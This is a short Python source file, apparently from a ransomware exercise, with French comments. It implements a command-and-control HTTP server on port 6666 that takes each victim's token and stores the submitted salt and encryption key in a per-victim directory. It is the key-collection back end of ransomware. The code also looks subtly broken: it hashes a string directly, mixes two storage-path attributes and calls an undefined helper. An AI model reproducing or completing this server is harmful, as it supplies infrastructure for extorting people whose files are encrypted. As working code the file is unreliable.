import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
         # On crée un répertoire du nom du token
        token = body["token"]
        directory = os.path.join(self.storage_path, sha256(token).hexdigest())
        os.makedirs(directory, exist_ok=True)

        # On écrit le sel et la clé dans les fichiers du réportoire
        with open(os.path.join(directory, "salt"), "wb") as f:
            f.write(self.b64_to_bin(body["salt"]))
        with open(os.path.join(directory, "key"), "wb") as f:
            f.write(self.b64_to_bin(body["key"]))

        return {"success": True}
        #on retourne une réponse pour confirmer l'opération

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()